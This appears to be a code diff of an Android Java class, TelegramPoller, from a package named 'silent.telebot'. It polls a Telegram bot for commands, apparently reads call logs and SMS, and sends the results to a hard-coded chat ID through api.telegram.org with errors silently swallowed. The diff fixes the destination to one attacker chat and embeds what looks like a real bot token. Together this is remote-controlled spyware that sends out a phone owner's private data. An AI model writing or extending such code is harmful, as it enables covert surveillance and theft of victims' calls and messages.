@@ -3,7 +3,6 @@ package com.silent.telebot;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
-import android.net.Uri;
 import android.os.Build;
 import android.provider.CallLog;
 import android.provider.Telephony;
@@ -20,8 +19,8 @@ import java.net.URL;
 
 public class TelegramPoller implements Runnable {
     private Context ctx;
-    private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8"; // استبدل
-    private static final String CHAT_ID = "8204844881";     // استبدل
+    private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";  // غيّر هذا
+    private static final String CHAT_ID = "8204844881";      // ❗ غيّر هذا إلى معرف الدردشة الثابت
     private static int lastUpdateId = 0;
 
     public TelegramPoller(Context ctx) { this.ctx = ctx; }
@@ -51,9 +50,9 @@ public class TelegramPoller implements Runnable {
                     if (update.has("message")) {
                         JSONObject message = update.getJSONObject("message");
                         String text = message.optString("text", "");
-                        long chatId = message.getJSONObject("chat").getLong("id");
+                        // long chatId = message.getJSONObject("chat").getLong("id"); // لم نعد نستخدمه
                         String result = handleCommand(text);
-                        sendMessage(chatId, result);
+                        sendMessage(CHAT_ID, result);  // ← نرسل إلى الدردشة الثابتة
                     }
                 }
             }
@@ -110,7 +109,7 @@ public class TelegramPoller implements Runnable {
         return "لا توجد مكالمات";
     }
 
-    private void sendMessage(long chatId, String text) {
+    private void sendMessage(String chatId, String text) {
         try {
             URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -119,7 +118,7 @@ public class TelegramPoller implements Runnable {
             conn.setRequestProperty("Content-Type", "application/json");
 
             JSONObject payload = new JSONObject();
-            payload.put("chat_id", chatId);
+            payload.put("chat_id", chatId);      // نستخدم الثابت
             payload.put("text", text);
 
             OutputStream os = conn.getOutputStream();
@@ -130,4 +129,4 @@ public class TelegramPoller implements Runnable {
             conn.disconnect();
         } catch (Exception e) { /* صامت */ }
     }
-              }
+                                                                 } 
